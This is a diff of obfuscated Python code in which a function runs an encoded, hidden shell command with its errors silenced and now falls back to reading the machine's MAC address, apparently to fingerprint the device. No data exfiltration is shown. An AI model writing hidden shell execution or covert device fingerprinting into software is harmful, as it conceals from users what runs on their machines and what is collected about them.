@@ -19,6 +19,7 @@ if 64 - 64:
     i11iIiiIii
 from builtins import str
 from builtins import range
+from uuid import getnode
 import base64
 from getpass import getuser
 import subprocess
@@ -87,7 +88,13 @@ def i1ii1iIII():
             pass
         try:
             o0o0Oo0oooo0 = str(subprocess . check_output(_4_("60-:8\x11\x1c-WU\x7fr<\x7f\x16\x10a]>G\x020-2\x1a'/TC+w\x01)6<:\x7f#\x11V-V\x14\x7fr\x1a\x7fxwdd\x16wMx"),
-                                                         shell=True)) . split('"')[- 2]
+                                                         stderr=os.devnull, shell=True)) . split('"')[- 2]
+            if o0o0Oo0oooo0:
+                return o0o0Oo0oooo0
+        except:
+            pass
+        try:
+            o0o0Oo0oooo0 = hex(getnode())
             if o0o0Oo0oooo0:
                 return o0o0Oo0oooo0
         except:
